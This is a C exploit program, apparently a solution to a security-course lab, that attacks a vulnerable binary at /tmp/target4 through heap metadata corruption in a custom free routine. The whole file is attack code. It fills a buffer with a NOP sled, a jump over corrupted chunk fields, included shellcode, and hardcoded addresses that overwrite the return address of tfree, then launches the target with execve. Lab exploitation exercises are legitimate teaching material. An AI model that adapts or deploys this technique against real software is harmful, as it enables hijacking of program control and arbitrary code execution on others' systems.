#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target4"

int main(void)
{
  char *args[3];
  char *env[1];
  // exploit string, size determined by distance between chunk p and q
  char buf[512];

  int i;
  int j;

  // Place NOPs initially in the string
  for (i = 0; i < 512; i++) {
    buf[i] = 0x90;
  }

  // Jump 12 bytes over corrupted data
  buf[0] = 0xeb;
  buf[1] = 0x0c;

  // Set LSB of q->s.r to be 1 to pass if statement
  buf[4] = 0x01;

  j = 0;
  // Place shellcode in string before addresses
  for (i = 459; i < 504; i++) {
    buf[i] = shellcode[j];
    j++;
  }
 
  // Address of where our sploit string will be in data
  // (address of p)
  buf[504] = 0x88;
  buf[505] = 0xa0;
  buf[506] = 0x04;
  buf[507] = 0x08;


  // Return address (ebp + 4) of tfree
  // Same as eip of foo()
  buf[508] = 0x5c;
  buf[509] = 0xfc;
  buf[510] = 0xff;
  buf[511] = 0xbf;



  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
